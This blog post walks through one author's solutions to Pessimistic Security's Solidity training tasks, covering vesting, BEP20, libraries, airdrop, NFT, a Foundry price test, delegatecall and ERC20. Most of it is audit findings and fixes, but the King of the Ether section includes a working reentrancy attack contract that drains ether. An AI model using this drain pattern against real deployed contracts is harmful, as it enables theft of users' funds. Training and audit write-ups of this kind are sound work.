---
layout: post
title:  "Pessimistic Security Tasks (Blockchain)"
command: cat pessimistic
---

Hello all, I found some cool solidity security tasks created by <a href="https://pessimistic.io/" target=_blank>Pessimistic Security</a> contributed by <a href="https://github.com/korepkorep" target=_blank>@korepkorep</a> and <a href="https://github.com/PavelCore" target=_blank>@PavelCore</a>. These challenges looks interesting to me, I solved all of them and you can find my solutions to them below. 

Pessimistic Security Tasks Repo : <a href="https://github.com/pessimistic-io/internship-tasks" target=_blank>Tasks</a>

My solution Repo : <a href="" target=_blank>Will Push Soon</a>

# Vesting

## Description

Vesting contract implements a Token Vesting Pattern. Token Vesting is the process in which purchased tokens are locked and released slowly over time. Particularly this Vesting contract follows the `cliff vesting`. Which means the tokens will be locked for the cliff duration and after cliff duration the tokens will be released linearly. The Vesting contracts initializes the `token`, `cliffMonthDuration`, `vestingMonthDuration`, accounts and amounts to be locked. To release tokens `release()` is called. The tokens will only be released after the cliff duration has been passed. If the cliff duration passed the `amountByMonth` is calculated and the `releaseAmount` is calculated for the total months from the star time. The released amount will be transfered to the caller of `release()` function.


## Vulnerabilities

The main vulnerability is that the tokens sent to the Vesting contract are locked forever. This is because the incorrect calculation of the `amountByMonth`. 

`uint256 amountByMonth = vestingInfo.locked / (vestingDuration + cliffDuration);`

Lets say, the `cliffMonthDuration = 2` and `vestingMonthDuration = 5` and tokens sent are 1000.

`vestingDuration + cliffDuration = (2 * 4 weeks) + (5 * 4 weeks)` = 16934400

amountByMonth = 1000 / 1693440, This result 0 in solidity. So, our tokens wont be released unless the total tokens sent are greater than 1693440. That too, we will get very less amount for each month.


## Attack POC

POC to catch the vulnerability :

```
    // Before modification
    function test_vesting() public{
        console.log("Balance of Address(1) : ", token.balanceOf(address(1)));
        console.log("Balance of Vesting : ", token.balanceOf(address(vest)));
        vm.startPrank(address(1));
        vm.warp(vest.startTimestamp() + 2*4 weeks + 1);

        vm.expectRevert();
        vest.release();

        vm.stopPrank();
        console.log("Balance of Address(1) : ", token.balanceOf(address(1)));
        console.log("Balance of Vesting : ", token.balanceOf(address(vest)));
    }
```

## Recommendation

To fix the bug, we need to calculate the amountByMonth by dividing the `(vestingDuration + cliffDuration)` by `4 weeks`. 

`uint256 amountByMonth = vestingInfo.locked / ((vestingDuration + cliffDuration) / 4 weeks );`

What this does is, it ensures to calculate the amout for one month, instead of calculating for the huge number of seconds.

Corrected Code : 

```diff
// This code snippet is provided by Pessimistic company.
// To apply for the internship opportunity at Pessimistic company,
// please fill out the form by visiting the following link: https://forms.gle/SUTcGi8X86yNoFnG7

// Caution: This code is intended for educational purposes only
// and should not be used in production environments.

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract Vesting {
    event TokenReleased(
        address indexed account,
        address indexed token,
        uint256 amount
    );

    struct Info {
        uint256 locked;
        uint256 released;
    }

    address public immutable token;
    uint256 public immutable startTimestamp;
    uint256 internal cliffDuration;
    uint256 internal vestingDuration;

    mapping(address => Info) internal _vesting;

    /**
     * @notice constructor
     * @param token_ - token address
     * @param cliffMonthDuration - cliff duration in months
     * @param vestingMonthDuration - vesting duration in months
     * @param accounts - vesting accounts
     * @param amounts - vesting amounts of accounts
     **/
    constructor(
        address token_,
        uint256 cliffMonthDuration,
        uint256 vestingMonthDuration,
        address[] memory accounts,
        uint256[] memory amounts
    ) {
        startTimestamp = uint64(block.timestamp);

        token = token_;
        cliffDuration = cliffMonthDuration * 4 weeks;
        vestingDuration = vestingMonthDuration * 4 weeks;

        for (uint256 i = 0; i < accounts.length; i++) {
            _vesting[accounts[i]] = Info({locked: amounts[i], released: 0});
        }
    }

    function release() external {
        //add history by block
        address sender = msg.sender;

        require(
            block.timestamp > startTimestamp + cliffDuration,
            "cliff period has not ended yet."
        );

        Info storage vestingInfo = _vesting[sender];
-       uint256 amountByMonth = vestingInfo.locked / (vestingDuration + cliffDuration);

+       uint256 amountByMonth = vestingInfo.locked / ((vestingDuration + cliffDuration)/ 4 weeks);

        uint256 releaseAmount = ((block.timestamp - startTimestamp) / 4 weeks) *
            amountByMonth -
            vestingInfo.released;

        require(releaseAmount > 0, "not enough release amount.");

        vestingInfo.released += releaseAmount;
        SafeERC20.safeTransfer(IERC20(token), sender, releaseAmount);
    }
}
```

POC To ensure secure code :

```
    // After fixing bug
    function test_vestingFixed() public{
        console.log("Balance of Address(1) : ", token.balanceOf(address(1)));
        console.log("Balance of Vesting : ", token.balanceOf(address(vest)));
        vm.startPrank(address(1));
        vm.warp(vest.startTimestamp() + 2*4 weeks + 1);

        vest.release();

        vm.stopPrank();
        console.log("Balance of Address(1) : ", token.balanceOf(address(1)));
        console.log("Balance of Vesting : ", token.balanceOf(address(vest)));
    }
```



# Vulnerable BEP20 

## Description

BEP20 basically refers to a token standard used for creating tokens on Binance Smart Chain, just like ERC20 for creating tokens on Ethereum.
BEP20 have many similarities with the ERC20 token standard. To interact with the BSC blockchain, a token based on the BEP-20 standard, BNB, is required to pay for transactions, just like Ether is used to pay for gas fees in the Ethereum blockchain. In fact, the BEP-20 standard is an extension of the ERC–20 standard on Ethereum.
 
## Observations

BEP20.sol file consists of a `IBEP20` interface, `Context` contract, `SafeMath` library, `Ownable` contract, `BEP20Token` contract. `BEP20Token` contract inherits the all the contracts and interface. 

- It has two mappings `_balances` and `_allowances` similar to ERC20
- BEP20 token has the `name`, `symbol`, `totalSupply`, `decimals`.
- The totalSupply is `1000000000000000 * 1e18` will be minted to the contract deployer.
- `balanceOf()` and `allowance()` returns the balances, allowances respectively.
- It has `approve()` and `transferFrom()` functions similar to ERC20.
- `increaseAllowances()` and `decreaseAllowances()` were used to change the allowances securely.
- `mint()` and `burn()` functions were implemented.
- `burnFrom()` function is appeared which is not in ERC20
- In `Ownable` contract CEI are not followed. Events were emitted before effects.

## Differences from Standard BEP20

1. `Transfer` event was not emitted inside the constructor, were the deployer gets the totalSupply amount of tokens.
2. No `getOwner()` function is implemented. Which is necessary as per the standard.
3. Burning a token emits an event `Burn()`. Which is not the standard event.
4. After burning a token, the `_burn()` should emit an event `Transfer(account, address(0), amount);`
5. `burnFrom()` function is defined. Which not necessary and not mentioned in standard.

## Recommendations

1. Implement `getOwner()` function which is necessary as per standard.
2. Remove `Burn` event, replace this with `Transfer` event.
3. Use `mint()` function instead of direct update of balance of owner inside constructor.
4. Use `increaseAllowances()` and `decreaseAllowances()` to change allowances instead of `approve()`.


# Libraries

## Description

A library in Solidity is a different type of smart contract that contains reusable code. Once deployed on the blockchain (only once), it is assigned a specific address and its properties / methods can be reused many times by other contracts in the Ethereum network.

## Observations

- The CountersUpgradeable and EnumerableSetUpgradeable are removed by the OpenZeppelin, they are no more accessible.
- We can use a storage variable as counter instead of CountersUpgradeable contract, because the arithmetic checks were done by the solidity compiler 0.8.x
- I have manually added these two contracts to keep the challenge as it is.
- The `Libraries.sol` consists of two library contracts `Items` and `Placements`.
- The `Items` library have two structs `ItemId` and `Item`. The `Items` library functions can be called on `ItemId` struct. (using Items for ItemId).
- `Placement` library have two structs `Placements` and `Registry` 
- CountersUpgradeable functions can be called on `CountersUpgradeable.Counter` and Items functions can be calleable on `Items.Item`
- An abstract contract `ManageStorage` also defined.

## Questions

1. How is the _placementRegistry from the ManagerStorage contract initialized? (Write a mini-contract with 3 variants of initialization. For instance, you can design it as 3 functions).

    - `_placementRegistry` is an instance of struct `Placements.Registry`. That is the `Registry` struct inside `Placements` library.
    - `placementRegisrty` is not initialized inside ManagerStorage.
    - Structs with nested mappings can't be directly constructed. i.e, we cannot use `Placements.Registry({})` initialization method.
    - This is because since version 0.7.0, structs or arrays that contain a mapping can only be used in storage, so Solidity complains because variables in an instantiation function would be in memory by default.

    ```
    contract Manager is ManagerStorage{
        constructor(){
            _placementRegistry.placementIdTracker = CountersUpgradeable.Counter(0);
        }
        function initialize() public {
            _placementRegistry.placementIdTracker = CountersUpgradeable.Counter(0);
        }

        function initializeX(Placements.Placement memory placement) public {
            _placementRegistry.placementIdTracker = CountersUpgradeable.Counter(0);
            uint placementId = Placements.register(_placementRegistry, placement);
        }
    }
    ```

2. Are the items at line 73 in the Placements contract added correctly? Why? (Give a detailed explanation).

    - The items were added to `placementRecord` items correctly. But the `placementId` in line 66 is not defined. This should the the current counter value after increment on Counter. 

    ```diff
        function register(Registry storage self, Placement memory placement) external returns (uint256 placementId) {
            self.placementIdTracker.increment();
    +       placementId = self.placementIdTracker.current();
            Placement storage placementRecord = self.placements[placementId];

            placementRecord.sender = placement.sender;
            placementRecord.beneficiary = placement.beneficiary;
            placementRecord.deadline = placement.deadline;

            for (uint256 i = 0; i < placement.items.length; i++) {
                placementRecord.items.push(placement.items[i]);
                placement.items[i].deposit(placement.fee);
            }
        }
    ```

    - The `placementRecord` is the `Placement` struct. i.e, `self.placements[placementId]` is points to the mapping inside `Registry` struct which gets the `Placement` struct from placementId.
    - `placementRecord` was updated with sender, beneficiary and deadline.
    - Then for loop fetches each Item struct from the array of Item structs. They will be pushed to the `placementRecord.items` which is an array of Item structs.
    - Then `deposit()` is called on the `placement.items[i]` which is a Item struct. We can see `using Items for Items.Item;` this enable `deposit()` to be called on the Item struct.


3. What is the purpose of using Items for ItemtId in Items library? (Give an extended explanation and specify the line in the code).

    - By `using Items for ItemId`, the ItemId struct gains access to functions defined within the Items library. This extends the functionality of the ItemId struct without directly modifying its definition. 
    - By extending `ItemId` with the Items library, functions like token and hash become directly accessible to instances of ItemId.
    - In line 40 `address itemToken = item.id.token();` is used to fetch the `itemToken`. 
    - The `token()` function is available to call on `item.id` which is nothing but the `ItemId` instance.

4. How is the placement fee deducted? Who is it paid from and to whom? How are msg.sender and address(this) changed with each external call? (Give a detailed explanation)

    - The registration can be done by using this contract,

    ```
    contract Manager is ManagerStorage{
        function registerPlacement(Placements.Placement memory placement) public returns (uint256 placementId) {
            placementId = Placements.register(_placementRegistry, placement);
        }
    }
    ```

    - Manager contract will takes the Placement struct and calls the `register()` function of librar `Placements`.
    - The first paramenter is the `Registry` struct and the second one is `Placements` struct. 
    - The `fee` amount of `token` will be paid from `msg.sender` to the `Manager` contract.
    - The `msg.sender` will always the caller of the `registerPlacement()` function. And the `this` will be the address of `Manager()` contract. 
    - This is because when calling public or external functions of libraries, `DELEGATECALL` will be made to the library.
    - What delegatecall does is, it maintains the context of call. That is the `msg.sender`. So, everytime the `register()` function of Placement library is called, the `msg.sender` will be the actual caller of the `registerPlacement()` function.


## Vulnerabilities

- The system id vulnerable, in such a that it can accept any tokens, An attacker could deploy a fake token and can register the placement.
- Attacker could even DOS the protocol by passing huge number of items array. 


# Airdrop

## Description

The Airdrop contract implements a Merkle tree for ERC20 pull-based airdrops.  Merkle trees used in airdrops , since Merkle proofs allow us to very efficiently implement ERC20 token airdrops. The implementation simple using Openzeppelin MerkleProof library. The `Airdrop` contract imports `MerkleProof` and `SafeERC20` contracts. It stores `token` address and merkleroot. And implements a `claim()` function for users to pass their merkleproof and amount to claim their tokens.

## Vulnerabilities

- First of all, the initial check `require(_erc20.balanceOf(msg.sender) == 0);` stops users claiming their tokens even if they haven't claimed it before.
- An attacker can claim his tokens initially and sends at least `1` token to the other user, in this case the user cannot claim their tokens.
- So, this is not an efficient check to find the user already claimed the tokens or not.
- Instead we can keep a mapping to check the claim status of the users.
- And the verification process also incorrectly finding the node.
- `keccak256(abi.encode(msg.sender))` is the node being verified. But this is not the correct way to check, it should include the `amount`.
- Also, as per OpenZeppelin docs it is suggested to use the following line to extract the leaf node.

    `bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(addr, amount))));`

- And check the balance of the Airdrop contract.
- Fixed code : 

    ```    
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.9;

    import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

    contract Airdrop {
        using MerkleProof for bytes32[];
        using SafeERC20 for IERC20;

        bytes32 private _merkleTreeRoot;

        IERC20 private _erc20;

        mapping (address => bool) private isClaimed;

        event Claim(address indexed who, uint256 amount);

        constructor(IERC20 erc20, bytes32 merkleTreeRoot) {
            _erc20 = erc20;
            _merkleTreeRoot = merkleTreeRoot;
        }

        function claim(uint256 amount, bytes32[] calldata proof) external {
            require(!isClaimed[msg.sender], "Already claimed");
            require(amount <= _erc20.balanceOf(address(this)), "Out of tokens" );

            bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(msg.sender, amount))));
            //bytes32 leaf = keccak256(abi.encode(msg.sender, amount)); // this will also works

            require(proof.verify(_merkleTreeRoot, leaf), "User was not found");

            isClaimed[msg.sender] = true;
            _erc20.safeTransfer(msg.sender, amount);

            emit Claim(msg.sender, amount);
        }
    }
    ```

# NFT

## Description & Observations

First of all the NFT.sol uses the compiler version `^0.8.2`. It imported many external openzeppelin library contracts. The `IERC2981Royalties`, `IRoyaltiesProvider`, `RoyaltiesV2` interfaces, `ERC2981Base`, `AbstractRoyalties` abstract contracts, `LibPart`, `LibRoyaltiesV2`, libraries and `NFT` contract were defined. It uses role based access control on functions. At an high level the NFT contracts implements an ERC721 token standard.

## Configuration

- To install dependencies of NFT.sol run following command.

    `npm i @openzeppelin/contracts@4.9.0-rc.0 --save-dev`

- Install `solc-select` and `0.8.2` solc version

    `pip3 install solc-select`

    `solc-select install 0.8.2`

    `solc-select use 0.8.2`

- Run slither 

    `slither . --solc-disable-warnings --exclude-informational`

## Slither Output & Validation

1. **[HIGH] Nft.withdraw() (src/NFT/NFT.sol#328-332) sends eth to arbitrary user.**

    - The vulnerability is because of unprotected call to a function sending Ether to an arbitrary address.

        ```
        /// @dev owner can withdraw Ether sent to the contract
        function withdraw() public onlyRole(CEO) {
            uint256 balance = address(this).balance;
            require(balance != 0);
            payable(msg.sender).transfer(balance);
        }
        ```

    - The `withdraw()` function should send the contract balance to the `owner`. Here, the balance was sent to the `msg.sender`.
    - Only callers who have the `CEO` role can call the `withdraw()` function.
    - The `CEO` role was assigned to the contract deployer. The actual owner is also the contract deployer.
    - So, `msg.sender` will be the `owner` or `CEO`.
    - If any unwanted bypass has been done to the `onlyRole(CEO)`, the funds will be lost.
    - Its recommended to send the balance to the `owner` instead of `msg.sender`.
    
        ```diff
        /// @dev owner can withdraw Ether sent to the contract
        function withdraw() public onlyRole(CEO) {
            uint256 balance = address(this).balance;
            require(balance != 0);
        -    payable(msg.sender).transfer(balance);
        +    payable(owner).transfer(balance);

        }
        ```

2. **[HIGH] Nft.tokenURI(uint256) (src/NFT/NFT.sol#235-243) calls abi.encodePacked() with multiple dynamic arguments.**

    - The vulnerability is a collision due to dynamic type usages in abi.encodePacked
    - As the solidity docs describe, two or more dynamic types are passed to abi.encodePacked. Moreover, these dynamic values are user-specified function arguments in external functions, meaning anyone can directly specify the value of these arguments when calling the function.
    
        ```
        function tokenURI(uint256 _tokenId)
            public
            view
            override(ERC721, ERC721URIStorage)
            returns (string memory)
        {
            string memory _str = Strings.toString(_tokenId);
            return string(abi.encodePacked(baseUri, _str, suffix));
        }
        ```
    - Here the vulnerability has no effect, because the abi.encodePacked is not dealing with user specifed dynamic inputs.
    - But, it missing a minor check of the `baseUri` length. 

        `return baseUri.length > 0 ? string(abi.encodePacked(baseUri, _str, suffix)): "" ;`
    - The usage of the `abi.encodePacked` becomes vulnerable in the case of hash verification. 
    - If you use `keccak256(abi.encodePacked(a, b))` and both a and b are dynamic types, it is easy to craft collisions in the hash value by moving parts of `a` into `b` and vice-versa.
    - More specifically, `abi.encodePacked("a", "bc") == abi.encodePacked("ab", "c")`.

3. **[MEDIUM] Reentrancy in Nft.summon(address,uint256) (src/NFT/NFT.sol#189-220)**

    - Slither found this as vulnerability because the state variable updates were done after the external calls.
    - The external calls was done on a token functions, they are not the low level `call`'s. 
    - There is no high severity in this vulnerability because, the `transferFrom` function doesnt invoke any fallback of the caller.
    - However attacker could write a malicious ERC-20 with custom transferFrom() or approve() that have re-entrancy hooks to attack a target.
    - To do this, attacker has to update the `utilityToken` or `governanceToken` address. This can only done by the users with role `CLEVEL`
    - To mitigate these possible attacks we can follow the CEI pattern.

        ```
            function summon(address _to, uint256 _tokenId) external whenNotPaused payable {

                require(summoningEnabled, 'Summoning is currently disabled');
                require(_exists(_tokenId), 'Token does not exist');
                require(ownerOf(_tokenId) == msg.sender, 'Sender is not the token owner');
                require(items[_tokenId].lastSummoned + summoningLock < block.timestamp, 'Need to wait to summon');
                require(items[_tokenId].summonCount < maxSummoningCount, 'Exceeded Summoning Count');
                
                uint256 utilitySummoningFee = summoningCosts[utilityToken][items[_tokenId].summonCount];
                uint256 governanceSummoningFee = summoningCosts[governanceToken][items[_tokenId].summonCount];

                // Push a summoned token to the items array
                items.push(Item(block.timestamp, 0, 0, _tokenId, true));
                items[_tokenId].summonCount++;
                items[_tokenId].lastSummoned = block.timestamp;

                if(utilitySummoningFee > 0) {
                    require(ERC20(address(utilityToken)).transferFrom(msg.sender, address(this), utilitySummoningFee), "Transfer failed");    
                }

                if(governanceSummoningFee > 0) {
                    require(ERC20(address(governanceToken)).transferFrom(msg.sender, address(this), governanceSummoningFee), "Transfer failed");
                }

                // Mint the new summoned token        
                uint256 tokenId = _tokenIdCounter.current();
                _tokenIdCounter.increment();
                _safeMint(_to, tokenId);
                
                emit Summoned(msg.sender, _to, tokenId);
            }
        ```
4. **[LOW] Nft.royaltyInfo(uint256,uint256).royalties (src/NFT/NFT.sol#356) shadows**

    - This is a variable shadowing vulnerability
    - `royalties` variable in `AbstractRoyalties` in line 85 is being shadowed by the `royalties` variable at line 356.

5. **[LOW] Nft.updateUtilityAddress(address)._address (src/NFT/NFT.sol#278) lacks a zero-check on**

    - Lack of zero address check of `_address` in `updateUtilityAddress()` function.

6. **[LOW] Nft.updateGovernanceAddress(address)._address (src/NFT/NFT.sol#284) lacks a zero-check on**

    - Lack of zero address check of `_address` in `updateGovernanceAddress()` function.

7. **[LOW] Nft.setOwner(address)._owner (src/NFT/NFT.sol#316) lacks a zero-check on**

    - Zero address check has to be done when updating new `owner` in `setOwner()` function.

8. **[LOW] Nft.updateRoyaltyAddress(address)._address (src/NFT/NFT.sol#363) lacks a zero-check on**

    - No zero address check of new royalty address in `updateRoyaltyAddress`.

9. **[LOW] Reentrancy in Nft.safeMint(address) (src/NFT/NFT.sol#181-187)**

    - Again slither marking this as a reentrancy, because the sate variable updation was done after the external call.
    - Update the function as follows

        ```
        function safeMint(address _to) public whenNotPaused onlyRole(CLEVEL) {
            uint256 tokenId = _tokenIdCounter.current();
            _tokenIdCounter.increment();
            items.push(Item(block.timestamp, 0, 0, 0, false));
            _safeMint(_to, tokenId);
            emit AdminMinted(msg.sender, _to, tokenId);
        }
        ```

10. **[LOW] Nft.summon(address,uint256) (src/NFT/NFT.sol#189-220) uses timestamp for comparisons.**

    - The usage of `block.timestamp` for deadline check can be exploited by the malicious validators.
    - This offers no protection as `block.timestamp` will have the value of whichever block the txn is inserted into, hence the txn can be held indefinitely by malicious validators.


# Foundry Task

## Description

The PriceGetter contract is designed to fetch the price conversion rate from DAI to USDC using Uniswap V3's price oracle. Contract have dai and usdc token addresses on arbitrum and Time Weighted Average Price (TWAP) as 1800.  The `daiToUsdc()` function calculates and returns the amount of USDC equivalent to a given amount of DAI.

To install dependencies :

```bash
    $ forge install uniswap/v3-core --no-commit
    $ forge install uniswap/v3-periphery --no-commit
```

## Initial Test Results : 

```bash
mj0ln1r@Linux:~/internship-tasks/Foundry task$ forge test -vv --fork-url https://rpc.ankr.com/arbitrum 
[⠑] Compiling...
No files changed, compilation skipped

Running 1 test for test/PriceGetter.t.sol:PriceGetterTest
[FAIL. Reason: assertion failed] test_DaiToWant() (gas: 88731)
Logs:
  Error: a < b not satisfied [uint]
    Value a: 1000497454863863263864864160056
    Value b: 1100000

Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 14.88s
 
Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/PriceGetter.t.sol:PriceGetterTest
[FAIL. Reason: assertion failed] test_DaiToWant() (gas: 88731)

Encountered a total of 1 failing tests, 0 tests succeeded
```

## Reason of test fail

The price range of the DAI/USDC pool is always lies between 0.9 to 1.1. This is because DAI and USDC are both stablecoins, which are designed to maintain a value close to 1 USD. The range of 0.9 to 1.1 is chosen to accommodate minor fluctuations in the price of these stablecoins. If the price of DAI/USDC falls outside this range, LPs may choose to remove their liquidity to avoid potential losses.

- The `assertGt(price, 9 * 10 ** (usdcDecimals - 1))` and `assertLt(price, 11 * 10 ** (usdcDecimals - 1))` lines are assertions to verify that the fetched price is within the expected range.
- That is the fetched prize should be between, `900000` and `1100000`.
- The price we result is in high precision. We can round the price in terms of `usdc` by dividing the price with `10**(usdcDecimals + daiDecimals)`

  ```
  function test_DaiToWant() public {
    uint256 price= priceGetter.daiToUsdc(10 ** daiDecimals);
    price = price/ 10**(usdcDecimals + daiDecimals);
    assertGt(price, 9 * 10 ** (usdcDecimals - 1));  // price > 0.9$
    assertLt(price, 11 * 10 ** (usdcDecimals - 1));  // price < 1.1$
  }
  ```
- We can also calculate the `price` by the formula **`1.0001 ** tick`**
- Then the result can be divided by `10**6` to get the price in `USDC`.
- The above updated test will pass and it ensures the price of usdc is between 0.9 to 1.1.

```bash
mj0ln1r@AHLinux:~/internship-tasks/Foundry task$ forge test -vv --fork-url https://rpc.ankr.com/arbitrum
[⠑] Compiling...
No files changed, compilation skipped

Running 1 test for test/PriceGetter.t.sol:PriceGetterTest
[PASS] test_DaiToWant() (gas: 23487)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.27s
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```


# Delegatecall

## Description

The DelegateCall.sol consists of four contract `Manager`, `MetaHub`, `Vault` and `Controller`. Two interfaces which are used to interact with `MetaHub` and `Controller`. One `Assets` library is defined. These contracts makes a complex calls and delegatecalls.

## Questions

0. Which contract is the entry point?

    - The entry point of this contract chain is the `Manager` contract.
    - The `deposit()` function in the `Manager` contract is the starting point for this contract interaction. When a user calls the deposit function with a specific tokenId, it triggers a call to the deposit function in the `Metahub` contract and the chain continues.

1. Where in the code is the `onERC721Received` function from Vault called? You need to write out the call chain.Where in the code is the `onERC721Received` function from Vault called? You need to write out the call chain.

    - The `onERC721Received` functionis defined inside `Vault` contract, but it was not called directly.
    - When we call `deposit()` function in `Manager` with a tokenId, it will call the `deposit()` function of the `MetaHub` contract.
    - The `MetaHub` contract now calls the `transferAssetToVault()` function on `Assets` library.
    - Then the `Assets` library will make a `delegatecall` to the `transferAssetToVault()` on the `Controller` contract.
    - The `Controller` contract will call the internal `_transferAsset()` function.
    - The `_transferAsset()` function will now calls the `transferFrom()` function of `ERC721` contract with the `to` value as the `Vault` address.
    - Finally, when the asset sent to the `Vault` the `onERC721Received()` will be invoked.
    - **NOTE**: In openzeppelin ERC721 contract the `onERC721Received()` onlycalled if we sent asset using `safeTransferFrom()`.
    - Tx chain : Manager -> MetaHub -> Assets -> Controller -> ERC721 -> Vault.onERC721Received().


2. What are `address(this)` and `msg.sender` equal to when Controller.transferAssetToVault is called?

    - The `address(this)` will be the `MetaHub` and `msg.sender` will be `Metahub`.
    - `Controller.transferAssetToVault()` is called by the `Assets` library through `delegatecall`. i.e, `msg.sender`, `address(this)` will be maintained from the `Assets`.
    - `Assets.transferAssetToVault()` is called by the `MetHub.deposit()` with `delegatecall` because the call is to a library.
    - So, the `msg.sender` and `address(this)` at  `Assets.transferAssetToVault()` same as values at `Controller.transferAssetToVault()`.

3. Will `require` of modifier `whenAssetDepositAllowed` (Vault contract) be reverted or not? Why?

    - The `require` will **not** reverted, because the `operator` is the `_metahub` address.
    - `operator` is the `msg.sender` inside the ERC721 contract.

        ```
        try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) 
        ```
    - `_msgSender()` is the operator that passed to `onERC721Received()`.
    - `msg.sender` in ERC721 is the `Metahub` contract address. Because the Metahub delegatecalls Controller function which calls the ERC721 contract.

4. Will modifier `onlyDelegatecall` from Controller contract correctly work out? Why?

    - `onlyDelegatecall` modifier is working properly.
        
        ```
        modifier onlyDelegatecall() {
            if (address(this) == __self) revert FunctionMustBeCalledThroughDelegatecall();
            _;
        }
        ```
    - `address(this)` when a delegatecall was made from `Assets` library will be the `address(this)` inside the `Assets`.
    - So, the `address(this)` at `onlyDelegatecall` modifier will be the address of `MetaHub`.
    - If the `address(this)` is same as the `__self` that means no delegatecall was made. So, the modifier will revert.

5. How many contracts are being deployed? Which ones?

    - Manager, Vault, Controller, MetaHub and already deployed Token contract.

# King of the Ether

## Description

The KingOfEther contract is implemented in the way that it is mentioned. Every user is able to send ether to the contracts unti the game is on. The one who stakes most will be the king and he will get 1 ether extra as a reward. And every users will be able to withdraw funds once the game is over. 

**KingsOfEther**

    ```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.20;

    contract KingOfEther{
        address public owner;
        address public king;
        bool public isGameOver;
        uint public startingTime;
        mapping (address => uint) public stakes;

        event King(address, uint);

        constructor() payable {
            require(msg.value == 1 ether, "Send 1 ether on deployment");
            startingTime = block.timestamp;
            owner = msg.sender;
            isGameOver = false;
        }

        function depositStake() public payable {
            require(msg.value > 0, "0 Amount not valid");
            require(!isGameOver, "Game ended");

            stakes[msg.sender] += msg.value;

            if(stakes[msg.sender] > stakes[king]){
                king = msg.sender;
                emit King(king, stakes[king]);
            }
        }

        function endGame() public {
            require(block.timestamp > startingTime + 30, "Can't end now");
            require(!isGameOver, "Alredy ended");

            stakes[king] += 1 ether;
            isGameOver = true;
        }

        function withdraw() public {
            require(isGameOver, "Game not ended");
            require(stakes[msg.sender] > 0, "You have no stakes");

            (bool success, ) = msg.sender.call{value: stakes[msg.sender]}("");
            require(success, "Withdraw Failed");
            stakes[msg.sender] = 0;
        }

    }
    ```

- The `withdraw()` function is vulnerable to Reentrancy as it makes external call before updating the stake value.
- The `AttackKing` contract will exploit the KingOfEther and drains all the ether.

    ```
    contract AttackKing{
        KingOfEther public kingContract;
        constructor(address _kingContract) {
            kingContract = KingOfEther(_kingContract);
        }
        function deposit() public payable  {
            kingContract.depositStake{value: 1 ether}();
        }
        function exploit() public {
            require(block.timestamp > kingContract.startingTime()+30, "Wait to exploit");
            if(!kingContract.isGameOver()){
                kingContract.endGame();
            }
            kingContract.withdraw();
        }

        receive() external payable {  
            if(address(kingContract).balance >= 1 ether){
                kingContract.withdraw();
            }
        }
    }
    ```
- Call `deposit()` first then call `exploit()` to attack the `KingOfEther`.


# Vulnerable ERC20

## Description

ERC20 is a fungible token standard came from EIP20. ERC20 Tokens are widely used fungible tokens in ethereum. The ERC20 token must implement the necessary functions mentioned in the EIP20 proposal. 

## Observations

- The ERC20.sol file consists of a `SafeMath` library and a `ERC20` contract. 
- `ERC20` contract uses SafeMath library on the uint256 instances. 
- It has basic state variables name, total_supply, symbol, decimals which are required for a ERC20 token.
- It uses two mappings `_balances` and `allowances` to keep track balances of user and allowances of a user.
- `balanceOf()` function returns the token balance of an address and `allowance()` returns approval amount of tokens by the owner to the spender.
- `transfer()` function transfers the tokens between addresses. And emits `Transfer` event on transfer.
- `approve()` function approves a spender to spend owner tokens. Emits `Approve` event on approval.
- `transferFrom()` used to transfer the tokens on behalf of the token owner by the spender.

## Differences from Standard ERC20

1. Vulnerable ERC20 enables custom decimal places, while many ERC20 tokens follows the standard 18 decimals.
2. Owner will get the the `totalSupply` of token balance after deploying the token.
3. `approve()` function not checking the `to` address. (Missing zero address check).
4. `transfer()` function is not following the standard ERC20 pattern.
5. Transferring tokens from one address to other address will transfer `6%` of tokens to the `owner`.
6. The `Transfer` event only emits with the actual `from` and `to` and `amount`.
7. `Transfer` event not emitted with the fee tokens sent to the `owner`.
8. Also emitted token amount is the amount that user wants to send. Not the actual amount that being sent (minus comission).
9. `TransferFrom()` function not checking for the allowed allowances, this not result in any token loss but overflow will occur if the amount passed to the TransferFrom is greater than the actual allowance
10. All the functions are `public` by default in standard ERC20.


## Vulnerabilities & Recommendations

1. `approve()` allows the spender account using a given number of tokens by updating the value of allowance.
2. Suppose the spender account is able to control miners' confirming order of transferring, then spender could use up all allowance before approve comes into effect.
3. After approve() is effective, spender has access to the new allowance, causing total tokens spent greater than expected and resulting in Re-approve attack.
4. Using `increaseApprove()` and `decreaseApprove()` functions are the recommendatios for it.
5. Recommended to declare state variables private and use implement public functions to read them.
6. Its recommended to inherit OpenZeppelin ERC20 contract to use.

***

Thank you !
